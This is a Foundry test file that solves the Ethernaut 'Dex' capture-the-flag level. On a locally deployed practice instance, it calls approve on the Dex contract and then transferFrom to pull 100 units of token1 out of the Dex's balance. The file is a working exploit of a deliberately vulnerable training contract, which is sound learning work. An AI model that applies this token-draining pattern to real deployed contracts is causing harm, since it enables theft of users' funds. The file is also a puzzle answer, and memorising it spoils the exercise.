pragma solidity ^0.8.10;

// dependencies
import "@std/Test.sol";
import "@std/console.sol";

// contracts
import "../src/Dex/DexFactory.sol";
import "../src/Ethernaut.sol";

contract DexTest is Test {
    address alice = address(0x1337);

    Ethernaut ethernaut;
    Dex ethernautDex;

    function setUp() public {
        vm.label(alice, "Alice");
        vm.label(address(this), "DexTest");
        vm.startPrank(alice);

        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        DexFactory dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);
        address levelAddress = ethernaut.createLevelInstance(dexFactory);
        ethernautDex = Dex(payable(levelAddress));

        vm.label(address(ethernautDex), "EthernautDex");
        vm.deal(alice, 5 ether);
    }

    function testExploit() public {        
        ethernautDex.approve(alice, 100);
        SwappableToken(ethernautDex.token1()).transferFrom(address(ethernautDex), alice, 100);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(address(ethernautDex)));

        vm.stopPrank();

        assert(levelSuccessfullyPassed);
    }
}